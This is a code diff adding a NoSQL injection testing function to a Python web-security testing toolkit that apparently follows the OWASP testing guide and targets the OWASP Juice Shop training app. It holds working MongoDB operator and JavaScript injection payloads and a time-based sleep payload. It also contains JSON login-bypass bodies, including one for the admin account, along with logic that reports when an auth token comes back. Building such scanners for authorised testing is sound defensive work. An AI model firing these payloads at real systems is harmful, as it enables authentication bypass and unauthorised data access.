@@ -27,7 +27,7 @@ import shutil
 import tempfile
 from pathlib import Path
 from typing import Dict, Any, List, Optional, Union
-from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
+from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote, urlunparse
 
 # mcp = FastMCP("input-validation-testing-enhanced")  # REMOVED: Using JSON-RPC adapter instead
 
@@ -3598,8 +3598,265 @@ async def test_http_incoming_requests(url: str, auth_session: Optional[Dict[str,
         return {"status": "error", "message": str(e)}
 
 
+async def test_nosql_injection(
+    url: str,
+    param: str = None,
+    auth_session: dict = None
+) -> dict:
+    """
+    WSTG-INPV-05.2: NoSQL Injection Testing
+
+    Tests for MongoDB/NoSQL injection vulnerabilities:
+    - MongoDB operator injection ($ne, $gt, $regex, $where, $exists)
+    - JavaScript injection in $where clauses
+    - JSON body operator injection for login bypass
+    - Parameter pollution with NoSQL operators
+
+    Targets: REST APIs using MongoDB (e.g., /rest/products/search, /rest/track-order/)
+    """
+    findings = []
+
+    # Auth session handling (same pattern as other functions)
+    req_kwargs = {"timeout": 30, "follow_redirects": True, "verify": False}
+    if auth_session:
+        if 'cookies' in auth_session:
+            req_kwargs['cookies'] = auth_session['cookies']
+        if 'headers' in auth_session:
+            req_kwargs['headers'] = auth_session.get('headers', {})
+        elif 'token' in auth_session:
+            req_kwargs['headers'] = {"Authorization": f"Bearer {auth_session['token']}"}
+
+    # NoSQL payloads for GET parameter injection
+    nosql_get_payloads = [
+        # MongoDB operator injection via query string
+        {"payload": "';return true;//", "type": "js_injection", "description": "JavaScript injection in MongoDB $where"},
+        {"payload": "';sleep(5000);//", "type": "time_based", "description": "Time-based NoSQL injection"},
+        {"payload": "' || true || '", "type": "boolean_bypass", "description": "Boolean-based NoSQL bypass"},
+        {"payload": "nosqlinjection'\"\\;{}", "type": "error_based", "description": "Error-based NoSQL detection"},
+        {"payload": "{\"$gt\":\"\"}", "type": "operator_injection", "description": "MongoDB $gt operator injection"},
+        {"payload": "{\"$ne\":null}", "type": "operator_injection", "description": "MongoDB $ne operator injection"},
+        {"payload": "{\"$regex\":\".*\"}", "type": "operator_injection", "description": "MongoDB $regex operator injection"},
+        {"payload": "{\"$exists\":true}", "type": "operator_injection", "description": "MongoDB $exists operator injection"},
+        # Juice Shop specific: track-order endpoint accepts order ID with potential NoSQL eval
+        {"payload": "1' || '1'=='1", "type": "js_injection", "description": "Order tracking NoSQL injection"},
+        {"payload": "1)(this.constructor.constructor('return this')())", "type": "prototype_pollution", "description": "Prototype pollution via NoSQL"},
+    ]
+
+    # NoSQL payloads for JSON body injection (login bypass)
+    nosql_json_payloads = [
+        {"email": {"$ne": ""}, "password": {"$ne": ""}},
+        {"email": {"$gt": ""}, "password": {"$gt": ""}},
+        {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
+        {"email": {"$exists": True}, "password": {"$exists": True}},
+        {"email": {"$ne": "nonexistent@x.com"}, "password": {"$ne": "wrongpass"}},
+        {"email": "admin@juice-sh.op", "password": {"$ne": ""}},
+        {"email": {"$regex": "admin.*"}, "password": {"$gt": ""}},
+    ]
+
+    # Error patterns indicating NoSQL injection
+    nosql_error_patterns = [
+        r"MongoError",
+        r"MongoDB",
+        r"SyntaxError.*unexpected",
+        r"ReferenceError",
+        r"BSON",
+        r"\$where",
+        r"mapReduce",
+        r"aggregate",
+        r"findOne",
+        r"collection\.find",
+        r"ObjectId",
+        r"Cannot read propert",
+        r"Unexpected token",
+        r"unterminated string",
+        r"illegal access",
+    ]
+
+    try:
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+
+        async with httpx.AsyncClient(**req_kwargs) as client:
+            # Get baseline response
+            try:
+                baseline_resp = await client.get(url)
+                baseline_length = len(baseline_resp.text)
+                baseline_status = baseline_resp.status_code
+            except Exception:
+                baseline_length = 0
+                baseline_status = 0
+
+            # ===== TEST 1: GET Parameter NoSQL Injection =====
+            test_params = [param] if param else list(params.keys())
+            if not test_params:
+                # If URL has no params, try common ones
+                test_params = ['q', 'search', 'query', 'id', 'order']
+
+            for param_name in test_params:
+                for payload_info in nosql_get_payloads:
+                    try:
+                        # Build test URL with payload
+                        test_params_dict = dict(params)
+                        test_params_dict[param_name] = [payload_info["payload"]]
+                        new_query = urlencode(test_params_dict, doseq=True)
+                        test_url = urlunparse(parsed._replace(query=new_query))
+
+                        resp = await client.get(test_url)
+                        resp_text = resp.text
+
+                        # Check for NoSQL error patterns
+                        for pattern in nosql_error_patterns:
+                            if re.search(pattern, resp_text, re.IGNORECASE):
+                                findings.append({
+                                    "parameter": param_name,
+                                    "payload": payload_info["payload"],
+                                    "type": payload_info["type"],
+                                    "description": payload_info["description"],
+                                    "evidence": f"Pattern matched: {pattern}",
+                                    "status_code": resp.status_code,
+                                    "severity": "high"
+                                })
+                                break
+
+                        # Check for significant response difference (potential data leak)
+                        resp_length = len(resp_text)
+                        if baseline_length > 0 and resp_length > baseline_length * 1.5 and resp.status_code == 200:
+                            findings.append({
+                                "parameter": param_name,
+                                "payload": payload_info["payload"],
+                                "type": payload_info["type"],
+                                "description": f"Response significantly larger ({resp_length} vs {baseline_length} baseline) - possible data extraction",
+                                "evidence": f"Response size difference: {resp_length - baseline_length} bytes",
+                                "status_code": resp.status_code,
+                                "severity": "high"
+                            })
+
+                        # Check for successful bypass (200 where baseline was 4xx/5xx)
+                        if baseline_status >= 400 and resp.status_code == 200:
+                            findings.append({
+                                "parameter": param_name,
+                                "payload": payload_info["payload"],
+                                "type": payload_info["type"],
+                                "description": f"NoSQL injection bypass: got {resp.status_code} instead of {baseline_status}",
+                                "evidence": resp_text[:200],
+                                "status_code": resp.status_code,
+                                "severity": "critical"
+                            })
+
+                    except Exception:
+                        continue
+
+            # ===== TEST 2: Path-based NoSQL Injection =====
+            # Test endpoints like /rest/track-order/{payload} (Juice Shop pattern)
+            path_test_urls = []
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+
+            # If URL ends with a path segment that could be an ID
+            path_parts = parsed.path.rstrip('/').split('/')
+            if path_parts:
+                # Replace last path segment with payload
+                for payload_info in nosql_get_payloads[:5]:
+                    new_parts = path_parts[:-1] + [payload_info["payload"]]
+                    test_path = '/'.join(new_parts)
+                    path_test_urls.append((f"{base_url}{test_path}", payload_info))
+
+            for test_url, payload_info in path_test_urls:
+                try:
+                    resp = await client.get(test_url)
+                    for pattern in nosql_error_patterns:
+                        if re.search(pattern, resp.text, re.IGNORECASE):
+                            findings.append({
+                                "parameter": "path_segment",
+                                "payload": payload_info["payload"],
+                                "type": payload_info["type"],
+                                "description": f"Path-based NoSQL injection: {payload_info['description']}",
+                                "evidence": f"Pattern matched: {pattern}",
+                                "url": test_url,
+                                "status_code": resp.status_code,
+                                "severity": "high"
+                            })
+                            break
+                except Exception:
+                    continue
+
+            # ===== TEST 3: JSON Body NoSQL Injection (Login Bypass) =====
+            # Try to find login-like endpoints
+            login_paths = ["/rest/user/login", "/api/user/login", "/api/login", "/login"]
+
+            for login_path in login_paths:
+                login_url = f"{base_url}{login_path}"
+                for json_payload in nosql_json_payloads:
+                    try:
+                        headers = req_kwargs.get('headers', {}).copy() if req_kwargs.get('headers') else {}
+                        headers["Content-Type"] = "application/json"
+
+                        resp = await client.post(
+                            login_url,
+                            json=json_payload,
+                            headers=headers
+                        )
+
+                        # Successful login bypass
+                        if resp.status_code == 200:
+                            try:
+                                resp_data = resp.json()
+                                if resp_data.get("authentication") or resp_data.get("token") or resp_data.get("access_token"):
+                                    findings.append({
+                                        "parameter": "json_body",
+                                        "payload": str(json_payload),
+                                        "type": "nosql_login_bypass",
+                                        "description": "NoSQL injection login bypass - authentication succeeded with operator injection",
+                                        "evidence": f"Got auth token with payload: {json_payload}",
+                                        "url": login_url,
+                                        "status_code": resp.status_code,
+                                        "severity": "critical"
+                                    })
+                            except Exception:
+                                pass
+
+                        # Check for NoSQL errors
+                        for pattern in nosql_error_patterns:
+                            if re.search(pattern, resp.text, re.IGNORECASE):
+                                findings.append({
+                                    "parameter": "json_body",
+                                    "payload": str(json_payload),
+                                    "type": "nosql_error_disclosure",
+                                    "description": f"NoSQL error disclosed with operator injection on {login_path}",
+                                    "evidence": f"Pattern matched: {pattern}",
+                                    "url": login_url,
+                                    "status_code": resp.status_code,
+                                    "severity": "medium"
+                                })
+                                break
+
+                    except Exception:
+                        continue
+
+        # Deduplicate findings by (parameter, type, url)
+        seen = set()
+        unique_findings = []
+        for f in findings:
+            key = (f.get("parameter"), f.get("type"), f.get("url", url))
+            if key not in seen:
+                seen.add(key)
+                unique_findings.append(f)
+
+        return {
+            "status": "success",
+            "data": {
+                "vulnerable": bool(unique_findings),
+                "findings": unique_findings,
+                "total_payloads_tested": len(nosql_get_payloads) * max(len(test_params), 1) + len(nosql_json_payloads) * len(login_paths),
+                "message": f"NoSQL injection testing complete. Found {len(unique_findings)} potential vulnerabilities." if unique_findings else "No NoSQL injection vulnerabilities detected."
+            }
+        }
+
+    except Exception as e:
+        return {"status": "error", "message": f"NoSQL injection testing failed: {str(e)}"}
+
+
 # ============================================================================
-# MODULE COMPLETE: 22 comprehensive input validation tools implemented
-# Coverage: WSTG 4.7.1 - 4.7.19 (All major tests covered) + HTTP Verb Tampering + HTTP Incoming Requests
+# MODULE COMPLETE: 23 comprehensive input validation tools implemented
+# Coverage: WSTG 4.7.1 - 4.7.19 (All major tests covered) + HTTP Verb Tampering + HTTP Incoming Requests + NoSQL Injection
 # ============================================================================
 
